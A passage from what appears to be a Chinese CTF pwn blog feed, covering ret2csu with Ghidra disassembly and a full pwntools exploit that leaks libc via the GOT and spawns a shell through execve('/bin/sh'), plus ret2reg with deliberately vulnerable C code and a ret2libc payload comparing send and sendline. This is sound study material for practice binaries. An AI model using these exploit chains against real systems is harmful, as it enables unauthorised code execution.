class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">                     *************************************************************</span><br><span class="line">                     *                           FUNCTION                         </span><br><span class="line">                     *************************************************************</span><br><span class="line">                     undefined  __libc_csu_init ()</span><br><span class="line">     undefined         AL:1           &lt;RETURN&gt;</span><br><span class="line">                     __libc_csu_init                                 XREF[5]:     Entry Point (*) , </span><br><span class="line">                                                                                  _start:00401066 (*) , </span><br><span class="line">                                                                                  _start:00401066 (*) ,  00402048 , </span><br><span class="line">                                                                                  00402120 (*)   </span><br><span class="line">00401190 41  57           PUSH       R15</span><br><span class="line">00401192 49  89  d7       MOV        R15 ,RDX</span><br><span class="line">00401195 41  56           PUSH       R14</span><br><span class="line">00401197 49  89  f6       MOV        R14 ,RSI</span><br><span class="line">0040119a 41  55           PUSH       R13</span><br><span class="line">0040119c 41  89  fd       MOV        R13D ,EDI</span><br><span class="line">0040119f 41  54           PUSH       R12</span><br><span class="line">004011a1 4c  8d  25       LEA        R12 ,[__frame_dummy_init_array_entry ]           = 401130h</span><br><span class="line">         68  2c  00 </span><br><span class="line">         00</span><br><span class="line">004011a8 55              PUSH       RBP</span><br><span class="line">004011a9 48  8d  2d       LEA        RBP ,[__do_global_dtors_aux_fini_array_entry  ]   = 401100h</span><br><span class="line">         68  2c  00 </span><br><span class="line">         00</span><br><span class="line">004011b0 53              PUSH       RBX</span><br><span class="line">004011b1 4c  29  e5       SUB        RBP ,R12</span><br><span class="line">004011b4 48  83  ec       SUB        RSP ,0x8</span><br><span class="line">         08</span><br><span class="line">004011b8 e8  43  fe       CALL       _init                                            int _init(EVP_PKEY_CTX * ctx)</span><br><span class="line">         ff  ff</span><br><span class="line">004011bd 48  c1  fd       SAR        RBP ,0x3</span><br><span class="line">         03</span><br><span class="line">004011c1 74  1b           JZ         LAB_004011de</span><br><span class="line">004011c3 31  db           XOR        EBX ,EBX</span><br><span class="line">004011c5 0f  1f  00       NOP        dword ptr [RAX ]</span><br><span class="line">                     LAB_004011c8                                    XREF[1]:     004011dc (j)   </span><br><span class="line">004011c8 4c  89  fa       MOV        RDX ,R15</span><br><span class="line">004011cb 4c  89  f6       MOV        RSI ,R14</span><br><span class="line">004011ce 44  89  ef       MOV        EDI ,R13D</span><br><span class="line">004011d1 41  ff  14       CALL       qword ptr [R12  + RBX *0x8 ]=&gt; -&gt; frame_dummy        undefined __do_global_dtors_aux(</span><br><span class="line">         dc                                                                          undefined frame_dummy()</span><br><span class="line">                                                                                     = 401130h</span><br><span class="line">                                                                                     = 401100h</span><br><span class="line">004011d5 48  83  c3       ADD        RBX ,0x1</span><br><span class="line">         01</span><br><span class="line">004011d9 48  39  dd       CMP        RBP ,RBX</span><br><span class="line">004011dc 75  ea           JNZ        LAB_004011c8</span><br><span class="line">                     LAB_004011de                                    XREF[1]:     004011c1 (j)   </span><br><span class="line">004011de 48  83  c4       ADD        RSP ,0x8</span><br><span class="line">         08</span><br><span class="line">004011e2 5b              POP        RBX</span><br><span class="line">004011e3 5d              POP        RBP</span><br><span class="line">004011e4 41  5c           POP        R12</span><br><span class="line">004011e6 41  5d           POP        R13</span><br><span class="line">004011e8 41  5e           POP        R14</span><br><span class="line">004011ea 41  5f           POP        R15</span><br><span class="line">004011ec c3              RET</span><br><span class="line">004011ed 0f              ??         0Fh</span><br><span class="line">004011ee 1f              ??         1Fh</span><br><span class="line">004011ef 00              ??         00h</span><br></pre></td></tr></table></figure><p>其中我需要利用到的有两个部分：<br />gadget1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                     LAB_004011de</span><br><span class="line">004011de 48  83  c4       ADD        RSP ,0x8</span><br><span class="line">         08</span><br><span class="line">004011e2 5b               POP        RBX</span><br><span class="line">004011e3 5d               POP        RBP</span><br><span class="line">004011e4 41  5c           POP        R12</span><br><span class="line">004011e6 41  5d           POP        R13</span><br><span class="line">004011e8 41  5e           POP        R14</span><br><span class="line">004011ea 41  5f           POP        R15</span><br><span class="line">004011ec c3               RET</span><br></pre></td></tr></table></figure><p>gadget2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                     LAB_004011c8</span><br><span class="line">004011c8 4c  89  fa       MOV        RDX ,R15</span><br><span class="line">004011cb 4c  89  f6       MOV        RSI ,R14</span><br><span class="line">004011ce 44  89  ef       MOV        EDI ,R13D</span><br><span class="line">004011d1 41  ff  14       CALL       qword ptr [R12  + RBX *0x8 ]</span><br><span class="line">004011d5 48  83  c3       ADD        RBX ,0x1</span><br><span class="line">004011d9 48  39  dd       CMP        RBP ,RBX</span><br><span class="line">004011dc 75  ea           JNZ        LAB_004011c8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>gadget1我们可以控制RBX,RBP,R12,R13,R14,R15</p><p>ret后传入gadget2_addr可以间接控制RDX,RSI,EDI；我们算是可以直接控制rdi的，因为edi寄存器就是rdi的低32位</p><p>为了可以正常使用gadget2我们需要有如下步骤：</p><ol><li>设置RBX为0，保证可以控制函数执行流</li><li>设置RBP为1，放置执行JNZ LAB_004011c8进入死循环，此处因为第一步将RBX设置为0，执行ADD RBX,0x1后RBX为1，解释一下JNZ是不满足跳转</li></ol><h3 id="实例"><a class="markdownIt-Anchor" href="#实例"></a> 实例</h3><p><a href="/cyber/pwn/ret2csu">ret2csu例题下载</a></p><p><em>File and Protection:</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6c469536de8293802ffc476e051f96cc9e316f6b, not stripped</span><br><span class="line"></span><br><span class="line">Canary                        : ✘ </span><br><span class="line">NX                            : ✓ </span><br><span class="line">PIE                           : ✘ </span><br><span class="line">Fortify                       : ✘ </span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure><p><em>程序分析</em>:<br />main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>,<span class="string">&quot;Hello, World\n&quot;</span>,<span class="number">0xd</span>);</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vulnerable_function函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void vulnerable_function(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_88 [128];</span><br><span class="line">  </span><br><span class="line">  read(0,local_88,0x200);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来是一个很简单的栈溢出，一般来说我们可以直接找到对应的gadget来构造ROP链，ROPgadget:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004011e4 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004011e6 : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004011e8 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004011ea : pop r15 ; ret</span><br><span class="line">0x00000000004011e3 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004011e7 : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401119 : pop rbp ; ret</span><br><span class="line">0x00000000004011eb : pop rdi ; ret</span><br><span class="line">0x00000000004011e9 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004011e5 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401016 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure><p>显然gadget并不满足我们要传入多参数的需求<br />构造<code>_libc_init_csu</code>利用函数：</p><blockquote><p>这里需要注意的是需要抬高7*8字节数据才能拼接上ret要跳转的地址，这个很容易忘，算是避坑了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r13,r14,r15,ret_addr</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*edge</span><br><span class="line">    payload += gadget1</span><br><span class="line">    <span class="comment"># Over ADD RSP,0x8</span></span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    <span class="comment"># Set RBX</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># Set RBP</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># Set call</span></span><br><span class="line">    payload += p64(r12)</span><br><span class="line">    <span class="comment"># Set RDI_LOW_32_BIT</span></span><br><span class="line">    payload += p64(r13)</span><br><span class="line">    <span class="comment"># Set RSI</span></span><br><span class="line">    payload += p64(r14)</span><br><span class="line">    <span class="comment"># Set RDX</span></span><br><span class="line">    payload += p64(r15)</span><br><span class="line">    <span class="comment"># Return Address</span></span><br><span class="line">    payload += p64(ret_addr)</span><br></pre></td></tr></table></figure><blockquote><p>注意这里泄露的时候由于main里面已经调用过write，所以got偏移表里面存储的是真实的调用地址；其次是搞懂qword ptr指令，是把r12指向的值作为参数传递，所以这里传递write_got地址指向write真实地址<br />接下来需要向bss写入system和/bin/sh地址<br />bss segement:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x00000000400000 0x00000000401000 0x00000000000000 r-- /home/andy/Workspace/buuctf_pwn/ret2csu_level5/ret2csu</span><br><span class="line">0x00000000401000 0x00000000402000 0x00000000001000 r-x /home/andy/Workspace/buuctf_pwn/ret2csu_level5/ret2csu</span><br><span class="line">0x00000000402000 0x00000000403000 0x00000000002000 r-- /home/andy/Workspace/buuctf_pwn/ret2csu_level5/ret2csu</span><br><span class="line">0x00000000403000 0x00000000404000 0x00000000002000 r-- /home/andy/Workspace/buuctf_pwn/ret2csu_level5/ret2csu</span><br><span class="line">0x00000000404000 0x00000000405000 0x00000000003000 rw- /home/andy/Workspace/buuctf_pwn/ret2csu_level5/ret2csu</span><br><span class="line"></span><br><span class="line">BSS ADDR:0x404038</span><br></pre></td></tr></table></figure><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ADDR</span></span><br><span class="line">gadget1=<span class="number">0x04011de</span></span><br><span class="line">gadget2=<span class="number">0x04011c8</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#Gadget usage:</span></span><br><span class="line">edge=<span class="number">0x88</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r13,r14,r15,ret_addr</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*edge</span><br><span class="line">    payload += p64(gadget1)</span><br><span class="line">    <span class="comment"># Over ADD RSP,0x8</span></span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    <span class="comment"># Set RBX</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># Set RBP</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># Set call</span></span><br><span class="line">    payload += p64(r12)</span><br><span class="line">    <span class="comment"># Set RDI_LOW_32_BIT</span></span><br><span class="line">    payload += p64(r13)</span><br><span class="line">    <span class="comment"># Set RSI</span></span><br><span class="line">    payload += p64(r14)</span><br><span class="line">    <span class="comment"># Set RDX</span></span><br><span class="line">    payload += p64(r15)</span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    <span class="comment"># Filler</span></span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> </span><br><span class="line">    <span class="comment"># Return Address</span></span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">#GET WRITE_ADDR</span></span><br><span class="line">csu(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,main_addr)</span><br><span class="line">write_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;WRITE ADDR:&quot;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#WRIET SHELL ADDR IN BSS SEGEMENT</span></span><br><span class="line">libc_base=write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LIBC BASE:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">exec_addr=libc_base+libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;BSS ADDR:&quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">csu(read_got,<span class="number">0</span>,bss_addr,<span class="number">16</span>,main_addr)</span><br><span class="line">payload=p64(exec_addr)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><em>小记：</em><br />这里本来想调用system，但是一直交互出错，我猜是本地GLIBC版本太高的问题（大概是Stack-Pivoting），暂时也不知道怎么怎么解决</p><p>call 的那一个参数如果填写<code>__init_array_start</code>就可以跳过call</p><hr /><h2 id="ret2addr"><a class="markdownIt-Anchor" href="#ret2addr"></a> ret2addr</h2><h3 id="概念-2"><a class="markdownIt-Anchor" href="#概念-2"></a> 概念</h3><p>这个是比较基础的，只是提及一下概念：shellcode写入栈中，覆盖返回地址跳转到shellcode写入地址执行</p><hr /><h2 id="ret2reg"><a class="markdownIt-Anchor" href="#ret2reg"></a> ret2reg</h2><p>刚好最近在看Made In Abyss,雷古来一张纪念<br /><img src='/pictures/reg.png' loading='lazy' height='50%' width='50%'></img></p><p>要了解这个crack方法需要先看看randomize_va_space属性</p><p>Linux平台的ASLR有三级：分别是0、1、2三级：</p><ol><li>0 没有随机化。关闭ASLR</li><li>1 保留随机化。libc stack mmap() VSSO空间被随机化</li><li>在1的基础上，分配的内存空间也将通过brk()被随机化</li></ol><blockquote><p>ASLR 并不负责<code>bss segement</code>和<code>data segement</code>的随机化；负责的是<code>PIE</code>(Linux)<br />开启ASLR Level2的方法是<code>echo 2 &gt; /etc/sys/kernel/randomize_va_space</code>；</p></blockquote><p>开启PIE的方法是编译时加上参数<code>-fpie</code>或者<code>-pie</code></p><p><strong>只有开启ASLR， PIE才会生效</strong></p><h3 id="概念-3"><a class="markdownIt-Anchor" href="#概念-3"></a> <em>概念</em></h3><ul><li>查看栈溢出返回时哪个寄存器指向缓冲区空间</li><li>查找对应的call 寄存器或者jmp 寄存器指令，将EIP设置为该指令地址</li><li>将寄存器所指向的空间上注入shellcode（确保该空间是可以执行的，通常是栈上的）</li></ul><p>即绕过地址混淆，函数参数传递过程中，值赋予给了寄存器，但是结尾没有寄存器复位，导致寄存器仍然存留参数值；这个时候我们就可以传入shellcode，然后寻找<code>call reg</code>和<code>jump reg</code>的语句来getshell</p><h3 id="漏洞避免"><a class="markdownIt-Anchor" href="#漏洞避免"></a> 漏洞避免</h3><p>这个漏洞避免很简单，只需要在使用寄存器后不要忘记寄存器复位或者清零，这样就可以规避相应攻击</p><h3 id="实例-2"><a class="markdownIt-Anchor" href="#实例-2"></a> 实例</h3><p>ret2reg.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">evil</span><span class="params">(<span class="type">char</span> *input)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    evil(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GCC编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector</span><br></pre></td></tr></table></figure><p>disassemble <code>evil</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function evil:</span><br><span class="line">   0x0000118d &lt;+0&gt;:  push   ebp</span><br><span class="line">   0x0000118e &lt;+1&gt;:  mov    ebp,esp</span><br><span class="line">   0x00001190 &lt;+3&gt;:  push   ebx</span><br><span class="line">   0x00001191 &lt;+4&gt;:  sub    esp,0x204</span><br><span class="line">   0x00001197 &lt;+10&gt;:call   0x11fc &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0x0000119c &lt;+15&gt;:add    eax,0x2e58</span><br><span class="line">   0x000011a1 &lt;+20&gt;:sub    esp,0x8</span><br><span class="line">   0x000011a4 &lt;+23&gt;:push   DWORD PTR [ebp+0x8]</span><br><span class="line">   0x000011a7 &lt;+26&gt;:lea    edx,[ebp-0x208]</span><br><span class="line">   0x000011ad &lt;+32&gt;:push   edx</span><br><span class="line">   0x000011ae &lt;+33&gt;:mov    ebx,eax</span><br><span class="line">   0x000011b0 &lt;+35&gt;:call   0x1050 &lt;strcpy@plt&gt;</span><br><span class="line">   0x000011b5 &lt;+40&gt;:add    esp,0x10</span><br><span class="line">   0x000011b8 &lt;+43&gt;:nop</span><br><span class="line">   0x000011b9 &lt;+44&gt;:mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x000011bc &lt;+47&gt;:leave  </span><br><span class="line">   0x000011bd &lt;+48&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>进行观察发现与register和buffer相关的语句;只要找到可控输入和寄存器之间的关系就可以利用了<br />payload大概如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_reg = 0xdeadbeef</span><br><span class="line">payload = shellcode + p32(filler-len(shellcode)) + p32(call_reg)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2csu </tag>
            
            <tag> ret2reg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn Send Or Sendline</title>
      <link href="/2022/11/20/pwn-use/"/>
      <url>/2022/11/20/pwn-use/</url>
      
        <content type="html"><![CDATA[<p>事情起因是这样的，今天做<code>geek challenge 2022</code>的一道简单ret2libc的时候，本来以为可以顺利的通exp，结果发现死活打不通，然后询问队友后发现竟然是小小的send和sendline引发的问题，以前一直不挺在一这个问题的，今天就分析一下这个问题。</p><h2 id="decompile-code"><a class="markdownIt-Anchor" href="#decompile-code"></a> Decompile Code</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_18 [<span class="number">16</span>];</span><br><span class="line">  </span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This is a eazy ret2xx pwn ;)&quot;</span>);</span><br><span class="line">  my_write(<span class="string">&quot;input something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,local_18,<span class="number">0x38</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="status"><a class="markdownIt-Anchor" href="#status"></a> status</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><h3 id="type"><a class="markdownIt-Anchor" href="#type"></a> type</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn3_3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld.so, for GNU/Linux 3.2.0, BuildID[sha1]=04b5723eae76de2b513909837f5ba33643eabbbc, not stripped</span><br></pre></td></tr></table></figure><h2 id="compare-send-and-sendline"><a class="markdownIt-Anchor" href="#compare-send-and-sendline"></a> Compare send and sendline</h2><h3 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> payload</h3><p><code>payload = b'a'*0x10+p64(0xdeadbeef)+p64(pop_rdi)+p64(libc_start_main)+p64(puts_plt)+p64(main_addr)</code></p><h3 id="send-byte"><a class="markdownIt-Anchor" href="#send-byte"></a> send byte</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Sent 0x38 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  ef be ad de  00 00 00 00  f3 12 40 00  00 00 00 00  │····│····│··@·│····│</span><br><span class="line">    00000020  f0 3f 40 00  00 00 00 00  84 10 40 00  00 00 00 00  │·?@·│····│··@·│····│</span><br><span class="line">    00000030  f0 11 40 00  00 00 00 00                            │··@·│····│</span><br><span class="line">    00000038</span><br></pre></td></tr></table></figure><h3 id="sendline-byte"><a class="markdownIt-Anchor" href="#sendline-byte"></a> sendline byte</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Sent 0x39 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  ef be ad de  00 00 00 00  f3 12 40 00  00 00 00 00  │····│····│··@·│····│</span><br><span class="line">    00000020  f0 3f 40 00  00 00 00 00  84 10 40 00  00 00 00 00  │·?@·│····│··@·│····│</span><br><span class="line">    00000030  f0 11 40 00  00 00 00 00  0a                        │··@·│····│·│</span><br><span class="line">    00000039</span><br></pre></td></tr></table></figure><hr /><h2 id="trouble-shooter"><a class="markdownIt-Anchor" href="#trouble-shooter"></a> Trouble Shooter</h2><h3 id="read-function"><a class="markdownIt-Anchor" 